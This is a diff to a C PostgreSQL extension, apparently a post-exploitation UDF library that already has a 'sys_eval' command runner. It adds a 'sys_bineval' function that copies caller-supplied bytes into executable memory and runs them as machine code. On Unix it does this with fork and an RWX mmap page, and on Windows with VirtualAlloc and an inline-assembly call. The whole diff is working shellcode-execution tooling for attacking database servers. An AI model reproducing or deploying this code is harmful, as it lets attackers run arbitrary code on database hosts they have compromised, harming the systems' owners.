@@ -25,13 +25,22 @@
 #define BUILDING_DLL 1
 #else
 #define DLLEXP
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
 #endif
 
 #include <postgres.h>
 #include <fmgr.h>
 #include <stdlib.h>
+#include <string.h>
 
 #include <ctype.h>
+
+#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+DWORD WINAPI exec_payload(LPVOID lpParameter);
+#endif
 
 #ifdef PG_MODULE_MAGIC
 PG_MODULE_MAGIC;
@@ -109,3 +118,75 @@ extern PGDLLIMPORT Datum sys_eval(PG_FUNCTION_ARGS) {
 
 	PG_RETURN_POINTER(result_text);
 }
+
+PG_FUNCTION_INFO_V1(sys_bineval);
+extern PGDLLIMPORT Datum sys_bineval(PG_FUNCTION_ARGS) {
+	text *argv0 = PG_GETARG_TEXT_P(0);
+	int32 argv0_size;
+	size_t len;
+
+#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+	int pID;
+	char *code;
+#else
+	int *addr;
+	size_t page_size;
+	pid_t pID;
+#endif
+
+	argv0_size = VARSIZE(argv0) - VARHDRSZ;
+	len = (size_t)argv0_size;
+
+#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+	// allocate a +rwx memory page
+	code = (char *) VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	strncpy(code, VARDATA(argv0), len);
+
+	WaitForSingleObject(CreateThread(NULL, 0, exec_payload, code, 0, &pID), INFINITE);
+#else
+	pID = fork();
+	if(pID<0)
+		PG_RETURN_INT32(1);
+
+	if(pID==0)
+	{
+		page_size = (size_t)sysconf(_SC_PAGESIZE)-1;	// get page size
+		page_size = (len+page_size) & ~(page_size);		// align to page boundary
+
+		// mmap an rwx memory page
+		addr = mmap(0, page_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, 0, 0);
+
+		if (addr == MAP_FAILED)
+			PG_RETURN_INT32(1);
+
+		strncpy((char *)addr, VARDATA(argv0), len);
+
+		((void (*)(void))addr)();
+	}
+
+	if(pID>0)
+		waitpid(pID, 0, WNOHANG);
+#endif
+
+	PG_RETURN_INT32(0);
+}
+
+#if defined(_WIN32) || defined(_WIN64) || defined(__WIN32__) || defined(WIN32)
+DWORD WINAPI exec_payload(LPVOID lpParameter)
+{
+	__try
+	{
+		__asm
+		{
+			mov eax, [lpParameter]
+			call eax
+		}
+	}
+	__except(EXCEPTION_EXECUTE_HANDLER)
+	{
+
+	}
+
+	return 0;
+}
+#endif
